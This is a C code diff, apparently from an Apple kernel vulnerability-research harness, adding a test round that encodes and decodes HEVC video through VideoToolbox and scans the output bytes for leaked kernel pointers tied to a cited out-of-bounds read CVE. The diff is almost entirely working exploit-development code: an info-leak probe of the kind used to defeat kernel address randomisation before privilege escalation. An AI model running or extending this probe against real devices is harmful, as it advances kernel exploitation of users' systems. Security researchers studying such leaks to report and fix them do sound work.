@@ -1514,6 +1514,42 @@ static int p17_scan_pixbuf(CVPixelBufferRef pb, const char *label) {
     return found;
 }
 
+/* Phase 17 r=178: VT compression output callback */
+static CMSampleBufferRef *p17_enc_samples = NULL;
+static volatile int p17_enc_sample_count = 0;
+#define P17_MAX_ENC_SAMPLES 32
+
+static void p17_enc_output_cb(void *outputCallbackRefCon,
+                                void *sourceFrameRefCon,
+                                OSStatus status,
+                                VTEncodeInfoFlags infoFlags,
+                                CMSampleBufferRef sampleBuffer) {
+    (void)outputCallbackRefCon; (void)sourceFrameRefCon; (void)infoFlags;
+    if (status == 0 && sampleBuffer && p17_enc_sample_count < P17_MAX_ENC_SAMPLES) {
+        CFRetain(sampleBuffer);
+        p17_enc_samples[p17_enc_sample_count++] = sampleBuffer;
+    }
+}
+
+/* Scan raw bytes for kernel pointer patterns */
+static int p17_scan_raw(const uint8_t *data, size_t len, const char *label) {
+    int found = 0;
+    size_t nqw = len / 8;
+    const uint64_t *qw = (const uint64_t *)data;
+    for (size_t i = 0; i < nqw; i++) {
+        uint64_t v = qw[i];
+        uint64_t stripped = v & 0xF0FFFFFFFFFFFFFFULL;
+        if ((stripped >> 32) == 0xFFFFFE00ULL ||
+            ((stripped >> 40) == 0xFFFFFE && (stripped & 0xFFFFULL) != 0)) {
+            rlog("  *** KPTR %s off=0x%zx: 0x%016llx ***\n",
+                 label, i * 8, (unsigned long long)v);
+            found++;
+            if (found >= 20) break;
+        }
+    }
+    return found;
+}
+
 static void *worker_thread(void *arg) {
     (void)arg;
     int argc = g_main_argc;
@@ -21049,6 +21085,204 @@ new_modes:
 
                 rlog("  === r=177 total kernel pointers found: %d ===\n", total_kptrs);
                 rlog("=== r=177 complete ===\n");
+
+            } else if (rounds == 178) {
+                /*
+                 * VideoToolbox encode→decode round-trip.
+                 * Encode known pixel data, capture compressed HEVC via callback,
+                 * then decode and scan both encoded output AND decoded pixels
+                 * for kernel pointer leaks (CVE-2026-112466 OOB read).
+                 */
+                rlog("=== r=178: VT encode→decode round-trip ===\n");
+                int r178_kptrs = 0;
+
+                int r178_dims[][2] = { {128, 128}, {320, 240}, {1920, 1080} };
+                for (int di = 0; di < 3; di++) {
+                    int rw = r178_dims[di][0], rh = r178_dims[di][1];
+                    rlog("\n  --- Round-trip %dx%d ---\n", rw, rh);
+
+                    /* Allocate encoder sample buffer array */
+                    p17_enc_samples = (CMSampleBufferRef *)calloc(P17_MAX_ENC_SAMPLES,
+                        sizeof(CMSampleBufferRef));
+                    p17_enc_sample_count = 0;
+
+                    /* Create HEVC encoder with output callback */
+                    VTCompressionSessionRef renc = NULL;
+                    OSStatus rst = VTCompressionSessionCreate(NULL, rw, rh,
+                        kCMVideoCodecType_HEVC, NULL, NULL, NULL,
+                        p17_enc_output_cb, NULL, &renc);
+                    rlog("  Encoder: %s (st=%d)\n", renc ? "OK" : "FAIL", (int)rst);
+
+                    if (renc) {
+                        /* Set properties to exercise different AVE code paths */
+                        VTSessionSetProperty(renc,
+                            kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+                        VTSessionSetProperty(renc,
+                            kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
+                        int maxkf = 1;
+                        CFNumberRef mkf = CFNumberCreate(NULL, kCFNumberIntType, &maxkf);
+                        VTSessionSetProperty(renc,
+                            kVTCompressionPropertyKey_MaxKeyFrameInterval, mkf);
+                        CFRelease(mkf);
+
+                        /* Create input pixel buffer with known pattern */
+                        CVPixelBufferRef rpb = NULL;
+                        CVPixelBufferCreate(NULL, rw, rh,
+                            kCVPixelFormatType_32BGRA, NULL, &rpb);
+
+                        if (rpb) {
+                            CVPixelBufferLockBaseAddress(rpb, 0);
+                            uint8_t *rbase = (uint8_t *)CVPixelBufferGetBaseAddress(rpb);
+                            size_t rbpr = CVPixelBufferGetBytesPerRow(rpb);
+                            /* Fill with distinguishable pattern: 0xDE per row */
+                            for (int y = 0; y < rh; y++) {
+                                memset(rbase + y * rbpr, 0xDE, rw * 4);
+                            }
+                            CVPixelBufferUnlockBaseAddress(rpb, 0);
+
+                            /* Encode 10 frames to give AVE more work */
+                            for (int fi = 0; fi < 10; fi++) {
+                                CMTime rpts = CMTimeMake(fi, 30);
+                                CMTime rdur = CMTimeMake(1, 30);
+                                VTEncodeInfoFlags einfo = 0;
+                                rst = VTCompressionSessionEncodeFrame(renc, rpb,
+                                    rpts, rdur, NULL, NULL, &einfo);
+                                if (fi < 3 || rst != 0)
+                                    rlog("  enc frame %d: st=%d\n", fi, (int)rst);
+                            }
+
+                            VTCompressionSessionCompleteFrames(renc,
+                                CMTimeMake(10, 30));
+                            rlog("  Encoded %d samples\n", p17_enc_sample_count);
+
+                            /* Scan encoded bitstream for kernel pointers */
+                            for (int si = 0; si < p17_enc_sample_count; si++) {
+                                CMSampleBufferRef esb = p17_enc_samples[si];
+                                CMBlockBufferRef eblk = CMSampleBufferGetDataBuffer(esb);
+                                if (eblk) {
+                                    size_t elen = CMBlockBufferGetDataLength(eblk);
+                                    uint8_t *edata = NULL;
+                                    size_t elen2 = 0;
+                                    CMBlockBufferGetDataPointer(eblk, 0, &elen2, NULL,
+                                        (char **)&edata);
+                                    if (edata && elen > 0) {
+                                        char elbl[64];
+                                        snprintf(elbl, sizeof(elbl),
+                                            "enc-%dx%d-s%d", rw, rh, si);
+                                        int enk = p17_scan_raw(edata, elen, elbl);
+                                        r178_kptrs += enk;
+                                        if (si < 3)
+                                            rlog("  enc sample %d: %zu bytes, kptrs=%d\n",
+                                                 si, elen, enk);
+                                    }
+                                }
+                            }
+
+                            /* Now decode the encoded samples back */
+                            if (p17_enc_sample_count > 0) {
+                                CMFormatDescriptionRef dfmt =
+                                    CMSampleBufferGetFormatDescription(p17_enc_samples[0]);
+                                if (dfmt) {
+                                    CFMutableDictionaryRef ddest = CFDictionaryCreateMutable(
+                                        NULL, 0, &kCFTypeDictionaryKeyCallBacks,
+                                        &kCFTypeDictionaryValueCallBacks);
+                                    int dpf = kCVPixelFormatType_32BGRA;
+                                    CFNumberRef dpfn = CFNumberCreate(NULL, kCFNumberIntType, &dpf);
+                                    CFDictionarySetValue(ddest,
+                                        kCVPixelBufferPixelFormatTypeKey, dpfn);
+
+                                    p17_vt_got_frame = 0;
+                                    p17_vt_pixbuf = NULL;
+
+                                    VTDecompressionOutputCallbackRecord dcb = {
+                                        .decompressionOutputCallback = p17_vt_decode_cb,
+                                        .decompressionOutputRefCon = NULL
+                                    };
+                                    VTDecompressionSessionRef ddec = NULL;
+                                    rst = VTDecompressionSessionCreate(NULL, dfmt,
+                                        NULL, ddest, &dcb, &ddec);
+                                    rlog("  Decoder from enc: %s (st=%d)\n",
+                                         ddec ? "OK" : "FAIL", (int)rst);
+
+                                    if (ddec) {
+                                        for (int si = 0; si < p17_enc_sample_count; si++) {
+                                            p17_vt_got_frame = 0;
+                                            if (p17_vt_pixbuf) {
+                                                CFRelease(p17_vt_pixbuf);
+                                                p17_vt_pixbuf = NULL;
+                                            }
+                                            VTDecodeFrameFlags dflags = 0;
+                                            VTDecodeInfoFlags dinfo = 0;
+                                            rst = VTDecompressionSessionDecodeFrame(ddec,
+                                                p17_enc_samples[si], dflags, NULL, &dinfo);
+                                            VTDecompressionSessionWaitForAsynchronousFrames(ddec);
+
+                                            if (p17_vt_pixbuf) {
+                                                char dlbl[64];
+                                                snprintf(dlbl, sizeof(dlbl),
+                                                    "dec-%dx%d-s%d", rw, rh, si);
+                                                int dnk = p17_scan_pixbuf(p17_vt_pixbuf, dlbl);
+                                                r178_kptrs += dnk;
+
+                                                /* Also check if decoded data differs from input */
+                                                CVPixelBufferLockBaseAddress(p17_vt_pixbuf,
+                                                    kCVPixelBufferLock_ReadOnly);
+                                                uint8_t *dbase = (uint8_t *)
+                                                    CVPixelBufferGetBaseAddress(p17_vt_pixbuf);
+                                                size_t dbpr = CVPixelBufferGetBytesPerRow(p17_vt_pixbuf);
+                                                /* Check first row for unexpected non-0xDE bytes */
+                                                int unexpected = 0;
+                                                if (dbase) {
+                                                    for (int x = 0; x < rw * 4 && x < (int)dbpr; x++) {
+                                                        uint8_t b = dbase[x];
+                                                        if (b != 0xDE && b != 0xDD && b != 0xDF &&
+                                                            b != 0x00 && b != 0xFF) {
+                                                            unexpected++;
+                                                            if (unexpected <= 5) {
+                                                                rlog("  dec s%d unexpected byte[%d]=0x%02x\n",
+                                                                     si, x, b);
+                                                            }
+                                                        }
+                                                    }
+                                                }
+                                                CVPixelBufferUnlockBaseAddress(p17_vt_pixbuf,
+                                                    kCVPixelBufferLock_ReadOnly);
+
+                                                if (si < 3)
+                                                    rlog("  dec sample %d: got_frame=%d kptrs=%d unexpected=%d\n",
+                                                         si, p17_vt_got_frame, dnk, unexpected);
+                                                CFRelease(p17_vt_pixbuf);
+                                                p17_vt_pixbuf = NULL;
+                                            } else if (si < 3) {
+                                                rlog("  dec sample %d: st=%d no pixbuf\n",
+                                                     si, (int)rst);
+                                            }
+                                        }
+                                        VTDecompressionSessionInvalidate(ddec);
+                                        CFRelease(ddec);
+                                    }
+                                    CFRelease(dpfn);
+                                    CFRelease(ddest);
+                                }
+                            }
+
+                            CVPixelBufferRelease(rpb);
+                        }
+                        VTCompressionSessionInvalidate(renc);
+                        CFRelease(renc);
+                    }
+
+                    /* Clean up encoded samples */
+                    for (int si = 0; si < p17_enc_sample_count; si++) {
+                        if (p17_enc_samples[si]) CFRelease(p17_enc_samples[si]);
+                    }
+                    free(p17_enc_samples);
+                    p17_enc_samples = NULL;
+                    p17_enc_sample_count = 0;
+                }
+
+                rlog("  === r=178 total kernel pointers: %d ===\n", r178_kptrs);
+                rlog("=== r=178 complete ===\n");
             }
 
             IOServiceClose(conn17);
